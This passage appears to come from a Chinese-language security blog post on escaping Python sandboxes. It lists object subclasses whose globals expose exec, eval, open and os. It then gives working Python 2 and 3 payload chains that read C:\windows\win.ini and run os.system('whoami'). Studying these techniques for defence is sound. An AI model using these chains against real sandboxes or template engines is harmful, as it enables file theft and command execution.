__builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None----------3-----------75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec128 1 &lt;class &#39;os._wrap_close&#39;&gt; file128 1 &lt;class &#39;os._wrap_close&#39;&gt; open128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__128 7 &lt;class &#39;os._wrap_close&#39;&gt; open128 11 &lt;class &#39;os._wrap_close&#39;&gt; open129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 open</code></pre><p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p><pre><code>----------2-----------                                      103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      ----------3-----------                                      75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              ----------4-----------                                      140 open                                                    140 exec                                                    </code></pre><p>既然筛选出来，那么选其中一个利用来读取文件：</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103]&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;</code></pre><p>完整执行</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;open&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessaging=1\n[xianshuabao]\nclient_uuid={xxx}\n&#39;</code></pre><p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p><pre><code>&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)misaki\user</code></pre><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>python2.7的模块(252)</p><pre><code>bsddbcompilerctypescurses......webbrowser.pywhichdb.pywsgiref.egg-infoxdrlib.pyxmllib.pyxmlrpclib.pyzipfile.py</code></pre><p>同样利用原代码进行筛选</p><pre><code>----------1-----------(40, &#39;file&#39;)----------2-----------(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)----------3-----------(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__import__&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;compile&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)----------4-----------(60, &#39;__import__&#39;)(60, &#39;file&#39;)(60, &#39;repr&#39;)(60, &#39;compile&#39;)(60, &#39;eval&#39;)(60, &#39;open&#39;)(60, &#39;execfile&#39;)</code></pre><p>进一步获取可以直接执行命令或者读取文件的类</p><pre><code>----------1-----------                                                                (40, &#39;file&#39;)                                                                          ----------2-----------                                                                (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   (60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   (72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    (77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   (78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               (79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               ----------3-----------                                                                (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   (59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   (60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                (61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        (62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             (72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              (77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          (78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 (78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             (79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 (79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             ----------4-----------                                                                (60, &#39;file&#39;)                                                                          (60, &#39;repr&#39;)                                                                          (60, &#39;eval&#39;)                                                                          (60, &#39;open&#39;)                                                                          (60, &#39;execfile&#39;)                                                                      </code></pre><p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p><pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]&lt;class &#39;site._Printer&#39;&gt;&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;os&#39;].system(&#39;whoami&#39;)misaki\user</code></pre><p>读取文件</p><pre><code>&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessagin</code></pre><p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p><p>筛选代码来源：<a 